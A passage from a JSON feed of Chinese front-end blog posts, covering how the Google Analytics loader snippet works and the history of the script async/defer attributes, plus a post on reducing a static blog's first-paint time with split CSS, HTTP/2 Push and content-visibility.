统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>){i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){</span><span class=\"language-javascript\">(i[r].<span class=\"hljs-property\">q</span>=i[r].<span class=\"hljs-property\">q</span>||[]).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)},i[r].<span class=\"hljs-property\">l</span>=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>();a=s.<span class=\"hljs-title function_\">createElement</span>(o),</span><span class=\"language-javascript\">m=s.<span class=\"hljs-title function_\">getElementsByTagName</span>(o)[<span class=\"hljs-number\">0</span>];a.<span class=\"hljs-property\">async</span>=<span class=\"hljs-number\">1</span>;a.<span class=\"hljs-property\">src</span>=g;m.<span class=\"hljs-property\">parentNode</span>.<span class=\"hljs-title function_\">insertBefore</span>(a,m)</span><span class=\"language-javascript\">})(<span class=\"hljs-variable language_\">window</span>,<span class=\"hljs-variable language_\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"language-javascript\"></span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {  <span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">q</span> = (<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">q</span> || []).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)};<span class=\"hljs-variable language_\">window</span>[<span class=\"hljs-string\">'ga'</span>].<span class=\"hljs-property\">l</span> = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">createElement</span>(<span class=\"hljs-string\">'script'</span>);a.<span class=\"hljs-property\">async</span> = <span class=\"hljs-number\">1</span>;a.<span class=\"hljs-property\">src</span> = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.<span class=\"hljs-property\">parentNode</span>.<span class=\"hljs-title function_\">insertBefore</span>(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">ga</span>=<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">ga</span>||<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>){(ga.<span class=\"hljs-property\">q</span>=ga.<span class=\"hljs-property\">q</span>||[]).<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>)};ga.<span class=\"hljs-property\">l</span>=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">ga</span>(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no \"document.write\" in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<p><img src=\"https://pic.skk.moe/file/moegirl/ckz6vn6qm00003f5yh5f0tvq8.svg\"></p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getFCP</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getLCP</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">getFID</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(name, value));</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content-visibility</span>: auto;  <span class=\"hljs-attribute\">contain</span>-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]